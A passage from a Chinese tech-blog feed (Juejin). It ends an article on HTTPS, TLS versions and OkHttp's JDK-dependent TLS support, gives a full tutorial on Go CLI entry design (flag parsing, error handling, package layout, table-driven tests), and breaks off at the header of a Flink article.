<table><thead><tr><th>HTTP版本</th><th>常见搭配TLS版本</th><th>备注</th></tr></thead><tbody><tr><td>HTTP/1.1</td><td>TLS 1.2、TLS 1.3</td><td>传统HTTPS常用组合，可灵活切换</td></tr><tr><td>HTTP/2</td><td>TLS 1.2（主流）、TLS 1.3</td><td>无强制绑定，支持更高版本TLS</td></tr><tr><td>HTTP/3</td><td>仅TLS 1.3</td><td>HTTP/3基于QUIC协议，QUIC原生内置TLS 1.3加密</td></tr></tbody></table>
<p>这也解释了为何 HTTP3.0 难以快速普及：TLS 1.3 对客户端版本（如 JDK、OkHttp）有严格要求，老旧客户端无法兼容。</p>
<h3 data-id="heading-15">使用OkHttp进行Https协议通信的一些细节问题</h3>
<p>很多人创建OkHttp客户端在代码里面可能就像这样，简单的只有一行代码：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">OkHttpClient</span> <span class="hljs-variable">CLIENT</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">OkHttpClient</span>.Builder()
        .readTimeout(<span class="hljs-number">16</span>, TimeUnit.SECONDS)
        .build();
</code></pre>
<p>看似简洁的代码背后，OkHttp 默认做了大量 SSL 配置：</p>
<ol>
<li>复用 JVM 默认 SSLContext：JVM 启动时加载系统默认 SSLContext，支持的 TLS 版本取决于 Java 版本；</li>
<li>加载系统信任证书库：使用操作系统 / JVM 内置的 CA 根证书，可验证绝大多数正规网站证书；</li>
<li>启用 MODERN_TLS 规范：默认启用 TLS 1.2、TLS 1.3，禁用不安全的 SSL/TLS 版本。</li>
</ol>
<h4 data-id="heading-16">核心坑点：JDK 版本影响 TLS 支持</h4>
<p>OkHttp 的默认 SSL 配置依赖 JVM 的 SSLContext，而不同 JDK 版本对 TLS 1.3 的支持不同：</p>
<ul>
<li>Java 8 u261 之前：默认不支持 TLS 1.3；</li>
<li>Java 8 u261+：需手动开启 TLS 1.3；</li>
<li>Java 11+：默认支持 TLS 1.3。</li>
</ul>
<p>这也是前文故障 2 的核心原因：服务端仅开启 TLS 1.3，而我方使用的低版本 JDK+OkHttp 默认仅支持 TLS 1.2，最终导致协议版本不兼容报错。</p>
<h2 data-id="heading-17">总结</h2>
<p>HTTPS 看似是 “加了层加密” 的 HTTP，实则是涉及证书、TLS/SSL、传输协议的复杂体系，任何一个环节的配置疏漏都可能引发生产级故障。结合本文的两起故障与技术拆解，可总结出以下核心结论：</p>
<ol>
<li><strong>证书是 HTTPS 的核心基石</strong>：不仅是 “加密” 的前提，更是身份验证的关键，证书过期 / 配置错误会直接导致客户端请求失败（而非仅浏览器提示不安全）；</li>
<li><strong>TLS 协议是 HTTPS 的加密核心</strong>：SSL 已被淘汰，TLS 1.2/1.3 是当前主流，且 TLS 版本直接影响 HTTP 协议的选择（如 HTTP3.0 强制要求 TLS 1.3）；</li>
<li><strong>客户端配置需适配服务端</strong>：OkHttp 等客户端的 SSL 配置依赖 JDK 版本，低版本 JDK 可能不支持高版本 TLS，需提前做好兼容性验证；</li>
<li><strong>HTTP3.0 普及仍需时间</strong>：尽管性能优势显著，但因 TLS 1.3 的兼容性要求，当前多数网站仍以 HTTP2.0+TLS 1.2 为主；</li>
<li><strong>基础配置不可忽视</strong>：无论是证书续期、TLS 协议配置，还是客户端 SSL 适配，这些看似 “基础” 的操作，却是保障 HTTPS 通信稳定的关键，一旦疏忽就可能酿成 P0 故障。</li>
</ol>
<p>作为技术人，我们不仅要解决故障，更要理解故障背后的技术原理 —— 只有吃透 HTTPS 的核心逻辑，才能从根源上避免类似问题的发生。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Go CLI 入口设计：参数解析、错误处理与项目分层实战]]></title>    <link>https://juejin.cn/post/7591702898080563215</link>    <guid>https://juejin.cn/post/7591702898080563215</guid>    <pubDate>2026-01-05T15:03:39.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7591702898080563215" data-draft-id="7591704324906942498" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Go CLI 入口设计：参数解析、错误处理与项目分层实战"/> <meta itemprop="keywords" content="后端,Go"/> <meta itemprop="datePublished" content="2026-01-05T15:03:39.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Java小成"/> <meta itemprop="url" content="https://juejin.cn/user/3614849960783160"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Go CLI 入口设计：参数解析、错误处理与项目分层实战
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3614849960783160/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Java小成
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-05T15:03:39.000Z" title="Mon Jan 05 2026 15:03:39 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Go语言学习系列文章</h2>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FhZIvsqGTTLdp7vn4bXrueA" target="_blank" title="https://mp.weixin.qq.com/s/hZIvsqGTTLdp7vn4bXrueA" ref="nofollow noopener noreferrer">01 Go 项目结构总是写乱？这个 50 行代码的 Demo 教你标准姿势</a></li>
</ul>
<h2 data-id="heading-1">1. 场景复现：那个让我头疼的时刻</h2>
<p>周一早上，我接手了一个线上的配置同步小工具。它的职责很简单：每天凌晨跑一次，从配置中心拉数据，然后推送到各个节点。</p>
<p>工具跑了大半年都没出过问题，直到那天——凌晨 3 点告警响了，日志里只有一行：</p>
<pre><code class="hljs">程序启动失败
</code></pre>
<p>我盯着这行字看了五分钟，脑子里全是问号：<strong>哪里失败了？参数没传？配置文件没找到？网络不通？</strong></p>
<p>排查了一个多小时，最后发现是运维同学改了启动脚本，漏掉了一个必填参数。但程序压根没告诉我是哪个参数出了问题。</p>
<p>那一刻我意识到：<strong>一个靠谱的程序，必须从入口就"把话说清楚"</strong>。参数怎么解析、默认值是什么、出错时怎么反馈——这些看似基础的东西，决定了凌晨 3 点你能不能多睡一会儿。</p>
<p>今天这个项目，就是我总结出来的 <strong>Go CLI 入口模板</strong>。它很小，但五脏俱全。</p>
<h2 data-id="heading-2">2. 架构蓝图：上帝视角看设计</h2>
<p>先来看整体结构。这个项目只有三个核心文件，但它展示了 Go 项目的<strong>标准分层方式</strong>：</p>
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b574048d49be41b4b2f82bc515d3a547~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YeWwj-aIkA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768230219&amp;x-signature=HrQex2fny45g5%2FxmnZ2R6gWS18Q%3D" alt="image-20260105225642842" loading="lazy"/>
<p><strong>核心设计思想</strong>：</p>
<ul>
<li><strong>main.go 只做调度</strong>：它不包含任何业务逻辑，只负责"接参数 → 调函数 → 输出结果"</li>
<li><strong>internal 目录放内部包</strong>：Go 有个约定，<code>internal</code> 目录下的代码只能被同一个模块引用，外部项目无法 import。这是一种"访问控制"</li>
<li><strong>一个目录一个包</strong>：<code>cliinfo</code> 负责参数解析，<code>reasons</code> 负责业务逻辑，职责清晰</li>
</ul>
<p>这种分层的好处是什么？<strong>每个包都可以独立写单元测试</strong>。你不需要启动整个程序，就能验证参数解析逻辑对不对。</p>
<h2 data-id="heading-3">3. 源码拆解：手把手带你读核心</h2>
<h3 data-id="heading-4">3.1 入口文件：main.go</h3>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">package</span> main

<span class="hljs-keyword">import</span> (
	<span class="hljs-string">"fmt"</span>
	<span class="hljs-string">"os"</span>
	<span class="hljs-string">"runtime"</span>
	<span class="hljs-string">"strings"</span>
	<span class="hljs-string">"time"</span>

	<span class="hljs-string">"learn-go/series/02/internal/cliinfo"</span>
	<span class="hljs-string">"learn-go/series/02/internal/reasons"</span>
)

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
	cfg, err := cliinfo.Parse(os.Args[<span class="hljs-number">1</span>:])
	<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
		fmt.Fprintln(os.Stderr, <span class="hljs-string">"参数错误:"</span>, err)
		os.Exit(<span class="hljs-number">1</span>)
	}

	lines := []<span class="hljs-type">string</span>{
		fmt.Sprintf(<span class="hljs-string">"你好，%s！"</span>, cfg.Name),
		fmt.Sprintf(<span class="hljs-string">"你正在体验：%s"</span>, strings.ToUpper(cfg.Lang)),
		fmt.Sprintf(<span class="hljs-string">"今天的结论：%s"</span>, reasons.Reason(cfg.Lang)),
		fmt.Sprintf(<span class="hljs-string">"运行环境：%s/%s"</span>, runtime.GOOS, runtime.GOARCH),
		fmt.Sprintf(<span class="hljs-string">"Go 版本：%s"</span>, runtime.Version()),
		fmt.Sprintf(<span class="hljs-string">"生成时间：%s"</span>, time.Now().Format(time.RFC3339)),
	}

	fmt.Println(strings.Join(lines, <span class="hljs-string">"\n"</span>))
}
</code></pre>
<p>这段代码只有 20 多行，但信息量很大。让我逐个拆解：</p>
<p><strong><code>os.Args[1:]</code> 是什么？</strong></p>
<p><code>os.Args</code> 是一个字符串切片，包含了命令行的所有参数。<code>Args[0]</code> 是程序本身的路径，<code>Args[1:]</code> 才是用户传入的参数。</p>
<p><strong><code>cfg, err := cliinfo.Parse(...)</code> 的多返回值</strong></p>
<p>这是 Go 最经典的模式。函数同时返回"结果"和"错误"，调用方必须处理错误。如果你写过 Java，可以把它理解为"不用 try-catch，但必须检查返回值"。</p>
<blockquote>
<p><strong>Go 知识点</strong>：Go 没有异常机制，错误通过返回值传递。<code>if err != nil</code> 是你会写一万遍的代码。</p>
</blockquote>
<p><strong><code>fmt.Fprintln(os.Stderr, ...)</code> 为什么用 Stderr？</strong></p>
<p>正常输出走 <code>stdout</code>，错误信息走 <code>stderr</code>。这是 Unix 的惯例。好处是：用户可以用管道把正常输出重定向到文件，而错误信息仍然显示在终端。</p>
<p><strong><code>os.Exit(1)</code> 的退出码</strong></p>
<p>程序正常结束返回 0，出错返回非零值。这让调用方（比如 shell 脚本）可以判断程序是否成功。</p>
<h3 data-id="heading-5">3.2 参数解析：cliinfo 包</h3>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">package</span> cliinfo

<span class="hljs-keyword">import</span> (
	<span class="hljs-string">"flag"</span>
	<span class="hljs-string">"fmt"</span>
	<span class="hljs-string">"strings"</span>
)

<span class="hljs-keyword">type</span> Config <span class="hljs-keyword">struct</span> {
	Name <span class="hljs-type">string</span>
	Lang <span class="hljs-type">string</span>
}

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Parse</span><span class="hljs-params">(args []<span class="hljs-type">string</span>)</span></span> (Config, <span class="hljs-type">error</span>) {
	fs := flag.NewFlagSet(<span class="hljs-string">"hello"</span>, flag.ContinueOnError)
	name := fs.String(<span class="hljs-string">"name"</span>, <span class="hljs-string">"工程师"</span>, <span class="hljs-string">"读者名称"</span>)
	lang := fs.String(<span class="hljs-string">"lang"</span>, <span class="hljs-string">"go"</span>, <span class="hljs-string">"关注的语言"</span>)
	fs.SetOutput(<span class="hljs-built_in">new</span>(strings.Builder))

	<span class="hljs-keyword">if</span> err := fs.Parse(args); err != <span class="hljs-literal">nil</span> {
		<span class="hljs-keyword">return</span> Config{}, err
	}

	cfg := Config{
		Name: strings.TrimSpace(*name),
		Lang: strings.ToLower(strings.TrimSpace(*lang)),
	}
	<span class="hljs-keyword">if</span> cfg.Name == <span class="hljs-string">""</span> {
		<span class="hljs-keyword">return</span> Config{}, fmt.Errorf(<span class="hljs-string">"name 不能为空"</span>)
	}
	<span class="hljs-keyword">if</span> cfg.Lang == <span class="hljs-string">""</span> {
		cfg.Lang = <span class="hljs-string">"go"</span>
	}
	<span class="hljs-keyword">return</span> cfg, <span class="hljs-literal">nil</span>
}
</code></pre>
<p><strong>为什么用 <code>flag.NewFlagSet</code> 而不是全局的 <code>flag.Parse()</code>？</strong></p>
<p>全局的 <code>flag</code> 包会直接操作 <code>os.Args</code>，而且解析失败时默认会调用 <code>os.Exit()</code>。这让代码<strong>无法测试</strong>——你没法在测试里模拟不同的参数组合。</p>
<p>用 <code>NewFlagSet</code> 创建独立的解析器，传入任意的 <code>[]string</code>，就可以在单元测试里随便折腾了。</p>
<p><strong><code>fs.String()</code> 返回的是指针</strong></p>
<pre><code class="hljs language-go" lang="go">name := fs.String(<span class="hljs-string">"name"</span>, <span class="hljs-string">"工程师"</span>, <span class="hljs-string">"读者名称"</span>)
<span class="hljs-comment">// name 的类型是 *string，不是 string</span>
</code></pre>
<p>为什么返回指针？因为 <code>Parse()</code> 调用之后，flag 包会把解析到的值写入这个指针指向的内存。如果返回值类型，就没法"回填"了。</p>
<blockquote>
<p><strong>Go 知识点</strong>：<code>*name</code> 是解引用操作，取出指针指向的值。这和 C 语言的指针概念一样。</p>
</blockquote>
<p><strong><code>flag.ContinueOnError</code> 的作用</strong></p>
<p>默认情况下，flag 解析失败会直接退出程序。设置 <code>ContinueOnError</code> 后，它会返回 error，让我们自己决定怎么处理。</p>
<p><strong><code>return Config{}, err</code> 的零值</strong></p>
<p>当出错时，我们返回一个"空的" Config。<code>Config{}</code> 是结构体的零值，所有字段都是默认值（string 的零值是空字符串）。</p>
<h3 data-id="heading-6">3.3 业务逻辑：reasons 包</h3>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">package</span> reasons

<span class="hljs-keyword">import</span> <span class="hljs-string">"strings"</span>

<span class="hljs-keyword">var</span> reasonByLang = <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">string</span>{
	<span class="hljs-string">"go"</span>:     <span class="hljs-string">"编译快、部署简单、并发模型清晰，适合做基础设施和服务端。"</span>,
	<span class="hljs-string">"python"</span>: <span class="hljs-string">"生态丰富、验证快，适合数据处理和脚本。"</span>,
	<span class="hljs-string">"java"</span>:   <span class="hljs-string">"工程成熟、生态庞大，适合大型企业级系统。"</span>,
}

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Reason</span><span class="hljs-params">(lang <span class="hljs-type">string</span>)</span></span> <span class="hljs-type">string</span> {
	key := strings.ToLower(strings.TrimSpace(lang))
	<span class="hljs-keyword">if</span> key == <span class="hljs-string">""</span> {
		key = <span class="hljs-string">"go"</span>
	}
	<span class="hljs-keyword">if</span> reason, ok := reasonByLang[key]; ok {
		<span class="hljs-keyword">return</span> reason
	}
	<span class="hljs-keyword">return</span> <span class="hljs-string">"先选一个目标场景，再决定语言。Go 适合服务端与工具链。"</span>
}
</code></pre>
<p><strong><code>map[string]string</code> 的声明</strong></p>
<p>这是 Go 的 map 类型，等价于 Java 的 <code>Map&lt;String, String&gt;</code> 或 Python 的 <code>dict</code>。</p>
<p><strong><code>reason, ok := reasonByLang[key]</code> 的双返回值</strong></p>
<p>访问 map 时，Go 允许你同时获取"值"和"是否存在"。如果 key 不存在，<code>ok</code> 为 false，<code>reason</code> 是零值。</p>
<p>这比 Java 的 <code>map.get(key) != null</code> 更优雅，因为它能区分"key 不存在"和"key 存在但值为 null"。</p>
<blockquote>
<p><strong>Go 知识点</strong>：这种 <code>value, ok := map[key]</code> 的写法叫做 "comma ok" 惯用法，在 Go 里非常常见。</p>
</blockquote>
<h3 data-id="heading-7">3.4 测试代码：表驱动测试</h3>
<pre><code class="hljs language-go" lang="go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">TestReason</span><span class="hljs-params">(t *testing.T)</span></span> {
	tests := []<span class="hljs-keyword">struct</span> {
		name <span class="hljs-type">string</span>
		lang <span class="hljs-type">string</span>
		want <span class="hljs-type">string</span>
	}{
		{name: <span class="hljs-string">"default"</span>, lang: <span class="hljs-string">""</span>, want: reasonByLang[<span class="hljs-string">"go"</span>]},
		{name: <span class="hljs-string">"go"</span>, lang: <span class="hljs-string">"go"</span>, want: reasonByLang[<span class="hljs-string">"go"</span>]},
		{name: <span class="hljs-string">"python"</span>, lang: <span class="hljs-string">"python"</span>, want: reasonByLang[<span class="hljs-string">"python"</span>]},
	}

	<span class="hljs-keyword">for</span> _, tt := <span class="hljs-keyword">range</span> tests {
		t.Run(tt.name, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(t *testing.T)</span></span> {
			<span class="hljs-keyword">if</span> got := Reason(tt.lang); got != tt.want {
				t.Fatalf(<span class="hljs-string">"Reason(%q) = %q, want %q"</span>, tt.lang, got, tt.want)
			}
		})
	}
}
</code></pre>
<p>这是 Go 社区推崇的<strong>表驱动测试</strong>风格。把测试用例定义成一个切片，然后循环执行。好处是：</p>
<ul>
<li>新增用例只需要加一行，不用复制粘贴整个测试函数</li>
<li>测试逻辑集中，一眼能看出覆盖了哪些场景</li>
<li><code>t.Run()</code> 让每个用例有独立的名字，失败时能精确定位</li>
</ul>
<h2 data-id="heading-8">4. 避坑指南 &amp; 深度思考</h2>
<h3 data-id="heading-9">坑 1：忘记处理 error</h3>
<pre><code class="hljs language-go" lang="go">cfg, _ := cliinfo.Parse(os.Args[<span class="hljs-number">1</span>:])  <span class="hljs-comment">// 危险！忽略了 error</span>
</code></pre>
<p>用 <code>_</code> 忽略 error 是 Go 新手最常犯的错误。程序不会报错，但 <code>cfg</code> 可能是零值，后续逻辑会出现诡异的 bug。</p>
<p><strong>建议</strong>：在 IDE 里开启 <code>errcheck</code> 或 <code>golangci-lint</code>，它会提醒你未处理的 error。</p>
<h3 data-id="heading-10">坑 2：全局 flag 导致测试困难</h3>
<p>如果你直接用 <code>flag.String()</code> 和 <code>flag.Parse()</code>，它们操作的是全局状态。多个测试用例之间会互相干扰，而且无法模拟不同的参数组合。</p>
<p><strong>建议</strong>：始终用 <code>flag.NewFlagSet()</code> 创建独立的解析器。</p>
<h3 data-id="heading-11">坑 3：错误信息不够具体</h3>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">return</span> Config{}, fmt.Errorf(<span class="hljs-string">"参数错误"</span>)  <span class="hljs-comment">// 太模糊</span>
<span class="hljs-keyword">return</span> Config{}, fmt.Errorf(<span class="hljs-string">"name 不能为空"</span>)  <span class="hljs-comment">// 好</span>
</code></pre>
<p>错误信息要能让用户<strong>不看代码就知道怎么修</strong>。</p>
<h3 data-id="heading-12">Demo 与生产的差距</h3>
<p>这个 Demo 是教学用的，生产环境还需要考虑：</p>
<ul>
<li><strong>配置文件支持</strong>：除了命令行参数，还要支持从文件、环境变量读取配置</li>
<li><strong>日志系统</strong>：用 <code>log/slog</code> 或 <code>zap</code> 替代 <code>fmt.Println</code>，支持结构化日志</li>
<li><strong>优雅退出</strong>：监听 <code>SIGTERM</code> 信号，做清理工作后再退出</li>
<li><strong>版本信息</strong>：编译时注入 git commit、构建时间等信息</li>
</ul>
<h2 data-id="heading-13">5. 快速上手 &amp; 改造建议</h2>
<h3 data-id="heading-14">运行命令</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 进入项目目录</span>
<span class="hljs-built_in">cd</span> series/02

<span class="hljs-comment"># 运行程序（使用默认参数）</span>
go run ./cmd/cli

<span class="hljs-comment"># 运行程序（自定义参数）</span>
go run ./cmd/cli -name=<span class="hljs-string">"汪小成"</span> -lang=python

<span class="hljs-comment"># 运行测试</span>
go <span class="hljs-built_in">test</span> ./...
</code></pre>
<h3 data-id="heading-15">工程化改造建议</h3>
<p><strong>1. 添加结构化日志</strong></p>
<p>把 <code>fmt.Println</code> 替换成 Go 1.21 引入的 <code>log/slog</code>：</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">import</span> <span class="hljs-string">"log/slog"</span>

slog.Info(<span class="hljs-string">"程序启动"</span>, <span class="hljs-string">"name"</span>, cfg.Name, <span class="hljs-string">"lang"</span>, cfg.Lang)
</code></pre>
<p><strong>2. 支持环境变量</strong></p>
<p>在 <code>Parse()</code> 里增加环境变量的读取，优先级：命令行参数 &gt; 环境变量 &gt; 默认值：</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">if</span> envName := os.Getenv(<span class="hljs-string">"CLI_NAME"</span>); envName != <span class="hljs-string">""</span> &amp;&amp; *name == <span class="hljs-string">"工程师"</span> {
    *name = envName
}
</code></pre>
<p><strong>3. 添加 <code>-version</code> 参数</strong></p>
<p>在编译时注入版本信息，方便排查问题：</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">var</span> Version = <span class="hljs-string">"dev"</span>  <span class="hljs-comment">// 编译时用 -ldflags 覆盖</span>

version := fs.Bool(<span class="hljs-string">"version"</span>, <span class="hljs-literal">false</span>, <span class="hljs-string">"显示版本信息"</span>)
<span class="hljs-keyword">if</span> *version {
    fmt.Println(<span class="hljs-string">"版本:"</span>, Version)
    os.Exit(<span class="hljs-number">0</span>)
}
</code></pre>
<h2 data-id="heading-16">6. 总结</h2>
<ul>
<li><strong>main 函数要短</strong>：只做调度，不写业务逻辑，这样才能测试</li>
<li><strong>错误必须处理</strong>：<code>if err != nil</code> 是 Go 的生存法则，别用 <code>_</code> 忽略</li>
<li><strong>用 NewFlagSet</strong>：独立的 flag 解析器让代码可测试</li>
<li><strong>internal 目录</strong>：Go 的访问控制机制，内部包不会被外部引用</li>
<li><strong>表驱动测试</strong>：用切片组织测试用例，新增场景只需加一行</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Flink源码阅读：Task数据交互]]></title>    <link>https://juejin.cn/post/7591744347826372634</link>    <guid>https://juejin.cn/post/7591744347826372634</guid>    <pubDate>2026-01-05T14:49:46.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7591744347826372634" data-draft-id="7591744347826356250" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Flink源码阅读：Task数据交互"/> <meta itemprop="keywords" content="Flink,大数据"/> <meta itemprop="datePublished" content="2026-01-05T14:49:46.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="面向Google编程"/> <meta itemprop="url" content="https://juejin.cn/user/1063982986695374"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Flink源码阅读：Task数据交互
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1063982986695374/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    面向Google编程
